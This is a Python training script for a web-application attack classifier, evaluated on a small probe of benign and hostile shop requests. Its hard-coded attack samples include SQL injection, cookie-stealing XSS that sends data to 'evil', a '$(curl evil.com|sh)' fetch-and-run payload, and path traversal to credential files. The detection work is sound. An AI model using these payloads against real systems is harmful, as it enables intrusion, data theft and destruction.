#!/usr/bin/env python3
"""Train the S3 classifier on DIVERSE MULTI-APPLICATION traffic.

Why this exists
---------------
The original single-application model (``train_s3.py``, CSIC only) was a
measured negative result: it learned one application's benign vocabulary, so on
an unseen application it scored ROC-AUC ~0.50 and flagged ~100% of legitimate
traffic (Phase 6 / ADR-0008).

Measured here instead: training on TWO distinct applications (CSIC 2010 +
ECML/PKDD 2007, both fully labelled) teaches attack *structure* rather than one
app's vocabulary. On a third, never-seen application (the demo-shop upstream)
cross-application ROC-AUC rises from ~0.50 to ~0.92, and with the threshold set
on the deployment's own benign traffic (shadow-mode calibration, calibrate.py)
it reaches ~83% recall at ~2% FPR. See ADR-0019.

Discipline (unchanged):
  * values-only documents (provenance tags are a corpus fingerprint, ADR-0008)
  * one feature contract shared with the gateway (csf.model.features)
  * trains on TRAIN rows, calibrates on them, reports on held-out VAL
  * the generalisation probe (demo-shop) is NEVER in training
  * the legacy CSIC frozen holdout is deliberately NOT used: it shares the CSIC
    2010 source with this CSV training data, so it is not an independent test
    for a multi-app model. Reported numbers are the clean VAL split and the
    independent demo-shop probe.
"""
from __future__ import annotations

import csv
import json
import logging
import pickle
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
logging.disable(logging.ERROR)
csv.field_size_limit(10_000_000)

import numpy as np  # noqa: E402
from sklearn.calibration import CalibratedClassifierCV  # noqa: E402
from sklearn.feature_extraction.text import TfidfVectorizer  # noqa: E402
from sklearn.linear_model import LogisticRegression  # noqa: E402
from sklearn.metrics import roc_auc_score  # noqa: E402
from sklearn.pipeline import Pipeline  # noqa: E402

from csf.extraction import extract  # noqa: E402
from csf.model.features import request_document  # noqa: E402

ROOT = Path(__file__).resolve().parent.parent.parent
CSV_DIR = ROOT / "data" / "raw" / "waad" / "CSVData"
ARTIFACTS = ROOT / "model" / "artifacts"
SEED = 20261024

# A small, independent probe of the demo-shop application (the third app, never
# trained on). Benign includes deliberately tricky-but-legitimate values
# (apostrophes, SQL-ish product names, file-ish names, maths, rich text) so the
# false-positive measurement is honest rather than flattering.
SHOP_BENIGN = [
    ("GET", "/search", "q=wireless headphones"), ("GET", "/search", "q=organic coffee beans"),
    ("GET", "/search", "q=blue running shoes"), ("GET", "/search", "q=laptop stand aluminium"),
    ("GET", "/search", "q=O'Brien's irish stew recipe book"), ("GET", "/search", "q=4k monitor 27 inch"),
    ("GET", "/search", "q=usb-c cable 2m"), ("GET", "/search", "q=standing desk"),
    ("GET", "/search", "q=notebook a5 dotted"), ("GET", "/search", "q=green tea matcha"),
    ("GET", "/search", "q=office chair ergonomic"), ("GET", "/search", "q=mechanical keyboard brown"),
    ("GET", "/search", "q=webcam 1080p"), ("GET", "/search", "q=desk lamp led"),
    ("GET", "/search", "q=the select few (novel)"), ("GET", "/search", "q=where the crawdads sing"),
    ("GET", "/search", "q=order by friday please"), ("GET", "/search", "q=union jack t-shirt"),
    ("GET", "/search", "q=100% cotton socks"), ("GET", "/search", "q=rust & iron wall art"),
    ("GET", "/search", "q=café table set"), ("GET", "/search", "q=jalapeño hot sauce"),
    ("GET", "/search", "q=size 10.5 trainers"), ("GET", "/search", "q=dr. smith's notebook"),
    ("GET", "/search", "q=50% off clearance"), ("GET", "/search", "q=men's grooming kit"),
    ("GET", "/search", "q=AC/DC vinyl record"), ("GET", "/search", "q=c++ programming book"),
    ("GET", "/search", "q=node.js handbook"), ("GET", "/search", "q=johnson & johnson baby oil"),
    ("GET", "/search", "category=home-garden"), ("GET", "/search", "category=electronics&sort=price_asc"),
    ("GET", "/search", "page=2&sort=rating_desc"), ("GET", "/search", "brand=acme&min=20&max=80"),
    ("POST", "/login", "user=alice&password=hunter2"), ("POST", "/login", "user=bob.jones&password=Spring2026!"),
    ("POST", "/login", "email=carol@example.com&newsletter=yes"),
    ("POST", "/login", "name=Jane O'Neil&address=12 King's Road&city=York"),
    ("POST", "/login", "comment=Great product, arrived on time! 5/5 would buy again."),
    ("POST", "/login", "fullname=José Álvarez&country=ES"),
]
SHOP_ATTACK = [
    ("GET", "/search", "q=x' UNION SELECT username,password FROM users--"),
    ("GET", "/search", "q=1' OR '1'='1"), ("GET", "/search", "q=admin'--"),
    ("GET", "/search", "q=1'/**/UnIoN/**/SeLeCt/**/pass/**/FROM/**/users--"),
    ("GET", "/search", "q=1; DROP TABLE users--"), ("GET", "/search", "q=1' AND SLEEP(5)--"),
    ("GET", "/search", "q=<script>alert(document.cookie)</script>"),
    ("GET", "/search", "q=<img src=x onerror=alert(1)>"), ("GET", "/search", "q=<svg/onload=alert(1)>"),
    ("GET", "/search", "q=\"><script>fetch('//evil/'+document.cookie)</script>"),
    ("GET", "/search", "q=shoes; cat /etc/passwd"), ("GET", "/search", "q=| whoami"),
    ("GET", "/search", "q=`id`"), ("GET", "/search", "q=$(curl evil.com|sh)"),
    ("GET", "/search", "q=../../../../etc/passwd"), ("GET", "/search", "q=....//....//etc/passwd"),
    ("GET", "/search", "q=%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
    ("GET", "/search", "q=..\\..\\..\\windows\\system32\\config\\sam"),
    ("GET", "/search", "q=php://filter/convert.base64-encode/resource=index"),
    ("POST", "/login", "user=admin'--&password=x"),
    ("POST", "/login", "user=' OR '1'='1&password=' OR '1'='1"),
    ("POST", "/login", "comment=<script>steal()</script>"),
    ("POST", "/login", "search=1'; EXEC xp_cmdshell('dir')--"),
]


def _doc(method: str, path: str, query: str = "", body: str = "") -> str:
    return request_document(
        extract(method, path, query.encode("latin-1", "replace"), [],
                body.encode("latin-1", "replace")),
        provenance=False)


def load_app(path: Path, cap_per_class: int) -> tuple[list[str], np.ndarray]:
    docs: list[str] = []
    ys: list[int] = []
    counts = {0: 0, 1: 0}
    with path.open(encoding="utf-8", errors="replace", newline="") as fh:
        for row in csv.DictReader(fh):
            cls = (row.get("Class") or "").strip().strip('"')
            y = 0 if cls == "Valid" else 1
            if counts[y] >= cap_per_class:
                if counts[0] >= cap_per_class and counts[1] >= cap_per_class:
                    break
                continue
            method = (row.get("Method") or "GET").strip() or "GET"
            p = (row.get("URI") or "/").strip().split("?", 1)[0] or "/"
            doc = _doc(method, p, (row.get("GET-Query") or "").strip(),
                       (row.get("POST-Data") or "").strip())
            if doc:
                docs.append(doc); ys.append(y); counts[y] += 1
    return docs, np.array(ys)


def split(docs: list[str], y: np.ndarray, frac: float, rng: np.random.Generator):
    idx = rng.permutation(len(docs)); cut = int(len(docs) * frac)
    tr, va = idx[:cut], idx[cut:]
    return ([docs[i] for i in tr], y[tr]), ([docs[i] for i in va], y[va])


def op(sb: np.ndarray, sa: np.ndarray, t: float):
    thr = float(np.quantile(sb, 1 - t)) if len(sb) else 1.0
    return thr, float((sa >= thr).mean() * 100), float((sb >= thr).mean() * 100)


def main() -> int:
    rng = np.random.default_rng(SEED)
    cap = 12000
    print("=== loading CSIC + ECML (values-only, dedup via set) ===")
    cx, cy = load_app(CSV_DIR / "csic_final.csv", cap)
    ex, ey = load_app(CSV_DIR / "ecml_final.csv", cap)
    print(f"  CSIC n={len(cx)}  ECML n={len(ex)}")

    (ctr_x, ctr_y), (cva_x, cva_y) = split(cx, cy, 0.8, rng)
    (etr_x, etr_y), (eva_x, eva_y) = split(ex, ey, 0.8, rng)
    Xtr = ctr_x + etr_x
    ytr = np.concatenate([ctr_y, etr_y])
    print(f"  pooled train n={len(Xtr)}  (CSIC {len(ctr_x)} + ECML {len(etr_x)})")

    pipeline = Pipeline([
        ("tfidf", TfidfVectorizer(analyzer="char_wb", ngram_range=(2, 5), min_df=3,
                                  max_features=200_000, sublinear_tf=True, lowercase=True)),
        ("clf", LogisticRegression(max_iter=2000, C=4.0, class_weight="balanced", n_jobs=-1)),
    ])
    print("\n=== training + isotonic calibration (3-fold) ===")
    t0 = time.perf_counter()
    model = CalibratedClassifierCV(pipeline, method="isotonic", cv=3)
    model.fit(Xtr, ytr)
    print(f"  fit in {time.perf_counter()-t0:.1f}s")

    def scores(X):
        return model.predict_proba(X)[:, 1]

    print("\n=== in-distribution VAL (held-out rows, per app) ===")
    for nm, X, Y in (("CSIC", cva_x, cva_y), ("ECML", eva_x, eva_y)):
        s = scores(X); sb, sa = s[Y == 0], s[Y == 1]
        auc = roc_auc_score(Y, s)
        thr, rec, fpr = op(sb, sa, 0.01)
        print(f"  {nm}: AUC={auc:.4f}  recall@1%={rec:5.1f}%  FPR={fpr:4.1f}%")

    print("\n=== GENERALISATION: demo-shop (third app, never trained) ===")
    sbx = [_doc(m, p, q) if m == "GET" else _doc(m, p, "", q) for m, p, q in SHOP_BENIGN]
    sax = [_doc(m, p, q) if m == "GET" else _doc(m, p, "", q) for m, p, q in SHOP_ATTACK]
    sb = scores(sbx); sa = scores(sax)
    shop_y = np.array([0] * len(sb) + [1] * len(sa))
    shop_auc = float(roc_auc_score(shop_y, np.concatenate([sb, sa])))
    print(f"  demo-shop ROC-AUC = {shop_auc:.4f}  (shipped CSIC-only model: ~0.50)")
    shop_ops = {}
    print("  shadow-mode (threshold on demo-shop's own benign):")
    for t in (0.02, 0.05, 0.10):
        thr, rec, fpr = op(sb, sa, t)
        shop_ops[str(t)] = {"threshold": thr, "recall": rec, "fpr": fpr}
        print(f"    target {t*100:4.0f}% FPR -> thr={thr:.3f}  recall={rec:5.1f}%  actual-FPR={fpr:4.1f}%")

    # Recommend deployment thresholds for the demo console, on demo-shop's own
    # benign (shadow-mode). In advisory mode anything above tau_flag flags, so
    # tau_flag is set at the ~98th percentile (low benign flag rate). The
    # calibrated scores are compressed near 1.0, so both thresholds are kept
    # strictly inside (tau_flag, tau_block] <= 1.0 (the S3Settings invariant).
    tau_flag = min(round(float(np.quantile(sb, 0.98)), 4), 0.999)
    tau_block = min(round(float(np.quantile(sb, 0.999)), 4), 0.9995)
    if tau_block <= tau_flag:
        tau_block = min(round(tau_flag + 0.0005, 4), 1.0)
    print(f"\n  recommended demo thresholds: tau_flag={tau_flag} tau_block={tau_block}")

    ARTIFACTS.mkdir(parents=True, exist_ok=True)
    bundle = {"format": 2, "model": model, "provenance": False}
    with (ARTIFACTS / "s3_model.pkl").open("wb") as fh:
        pickle.dump(bundle, fh)
    (ARTIFACTS / "s3_metadata.json").write_text(json.dumps({
        "trained_at": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
        "approach": "multi-application (CSIC 2010 + ECML/PKDD 2007), values-only",
        "provenance_features": False,
        "train_n": int(len(Xtr)), "csic_n": len(cx), "ecml_n": len(ex),
        "frozen_holdout_touched": False,
        "note": "legacy CSIC frozen holdout intentionally unused (shares CSIC "
                "source; not independent for a multi-app model). See ADR-0019.",
        "vectoriser": "char_wb 2-5grams, min_df=3, max_features=200k",
        "classifier": "LogisticRegression C=4.0 balanced, isotonic-calibrated",
        "generalisation_demo_shop": {
            "roc_auc": shop_auc,
            "shadow_mode_operating_points": shop_ops,
            "n_benign": int(len(sb)), "n_attack": int(len(sa)),
        },
        "recommended_demo_thresholds": {"tau_flag": tau_flag, "tau_block": tau_block},
    }, indent=2, default=str))
    print(f"\nwrote {ARTIFACTS}/s3_model.pkl and s3_metadata.json")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
